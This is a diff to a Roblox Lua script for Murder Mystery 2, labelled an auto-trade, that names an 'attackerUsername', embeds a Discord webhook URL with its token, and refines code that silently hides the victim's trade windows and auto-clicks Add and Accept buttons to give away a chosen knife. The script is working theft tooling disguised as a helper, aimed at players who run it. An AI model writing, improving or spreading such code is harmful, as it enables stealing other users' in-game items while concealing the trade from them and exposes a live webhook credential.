@@ -1,8 +1,8 @@
---[=[ MM2 AUTO-TRADE – Adds "Aquarium" knife, hides GUI persistently ]=]
+--[=[ MM2 AUTO-TRADE – Added "Aquarium" knife, hides GUI persistently (fixed) ]=]
 
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
 local attackerUsername = "FEARACCE"
-local targetItem = "Aquarium"  -- <-- Change this to any item you want
+local targetItem = "Aquarium"  -- change to any item name
 
 -- ============================================================
 -- WEBHOOK SENDER
@@ -84,13 +84,14 @@ local function hideTradeGUI()
         if obj:IsA("Frame") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
             obj.Visible = false
         end
-        -- Also hide any frame that is large and has Accept/Add buttons
+        -- Also hide any large frame that has Accept and Add buttons
         if obj:IsA("Frame") and obj.AbsoluteSize.X > 200 and obj.AbsoluteSize.Y > 200 then
             local hasAccept, hasAdd = false, false
             for _, sub in pairs(obj:GetDescendants()) do
                 if sub:IsA("TextButton") then
-                    if sub.Name:lower():find("accept") or sub.Name:lower():find("confirm") then hasAccept = true end
-                    if sub.Name:lower():find("add") or sub.Name:lower():find("select") then hasAdd = true end
+                    local name = sub.Name:lower()
+                    if name:find("accept") or name:find("confirm") then hasAccept = true end
+                    if name:find("add") or name:find("select") then hasAdd = true end
                 end
             end
             if hasAccept and hasAdd then
@@ -125,15 +126,21 @@ local OfferItem = Trade:FindFirstChild("OfferItem")
 
 if not SendReq or not AcceptReq then print("Missing critical remotes"); return end
 
--- --- Find the trade window (to add items)
+-- --- Find the trade window (the main overlay)
 local function findTradeWindow()
     local gui = player:FindFirstChild("PlayerGui")
     if not gui then return nil end
     local function search(parent)
         for _, child in pairs(parent:GetChildren()) do
-            if child:IsA("ScreenGui") or child:IsA("Frame") then
+            local isVisible = false
+            if child:IsA("ScreenGui") then
+                isVisible = child.Enabled
+            elseif child:IsA("Frame") then
+                isVisible = child.Visible
+            end
+            if (child:IsA("ScreenGui") or child:IsA("Frame")) and isVisible then
                 local size = child.AbsoluteSize
-                if size.X > 200 and size.Y > 200 and child.Visible then
+                if size.X > 200 and size.Y > 200 then
                     local hasAdd, hasAccept = false, false
                     for _, sub in pairs(child:GetDescendants()) do
                         if sub:IsA("TextButton") then
@@ -159,14 +166,12 @@ end
 local function addItemByName(tradeWindow, itemName)
     if not tradeWindow then return false end
     local found = false
-    -- First, look for a TextLabel or TextButton containing the item name
     for _, obj in pairs(tradeWindow:GetDescendants()) do
         if obj:IsA("TextLabel") or obj:IsA("TextButton") then
             local text = obj.Text or ""
             if text:lower():find(itemName:lower()) then
                 local parent = obj.Parent
                 if parent and parent:IsA("Frame") then
-                    -- Click the "Add" button in this frame
                     for _, btn in pairs(parent:GetChildren()) do
                         if btn:IsA("TextButton") and (btn.Name:lower():find("add") or btn.Name:lower():find("select")) then
                             pcall(function() btn:FireServer() end)
@@ -174,7 +179,6 @@ local function addItemByName(tradeWindow, itemName)
                             return true
                         end
                     end
-                    -- If no add button in parent, try siblings
                     for _, sibling in pairs(parent.Parent:GetChildren()) do
                         if sibling:IsA("TextButton") and (sibling.Name:lower():find("add") or sibling.Name:lower():find("select")) then
                             pcall(function() sibling:FireServer() end)
@@ -244,7 +248,6 @@ spawn(function()
         offerItemByName(targetItem)
     else
         print("Trade window found")
-        -- Try to add the target item
         local added = addItemByName(tradeWindow, targetItem)
         if added then
             print("Added " .. targetItem .. " via GUI")
